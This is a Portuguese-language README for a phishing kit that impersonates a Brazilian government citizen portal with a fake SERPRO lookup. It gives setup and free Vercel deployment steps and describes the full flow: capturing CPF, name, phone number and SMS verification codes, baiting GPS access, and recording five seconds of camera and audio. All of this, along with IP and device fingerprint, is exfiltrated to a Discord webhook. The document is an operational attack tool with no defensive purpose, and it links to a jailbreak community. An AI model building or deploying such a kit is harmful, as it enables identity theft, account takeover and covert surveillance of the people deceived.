# portal-cidadao

absolute ollie, built by olivia — https://discord.gg/ojailbreaks

## subir
```
npm install
npm run dev
```
abre em http://localhost:3000

## .env.local
```
DISCORD_WEBHOOK=teu webhook
CAPTURE_SECONDS=5
PUBLIC_BASE_URL=https://seu-dominio.com
```

## fluxo
- `/` → form CPF/nome, loading fake "consultando SERPRO"
- `/verificar` → pede número → pede código SMS → tudo pro webhook
- `/sucesso` → notificação (isca p/ geo) → câmera+áudio 5s → webhook

## deploy
Vercel grátis, aponta DNS, pronto. Webhook fica em env var, nunca no bundle.

## embed do discord
- nome, cpf, celular, código SMS
- GPS exato (lat/lng + link maps)
- IP + cidade/país + ISP
- device fingerprint (OS, GPU, cores, RAM, bateria, idioma, tz)
- UA completo, referrer, URL
- vídeo + áudio anexado no post
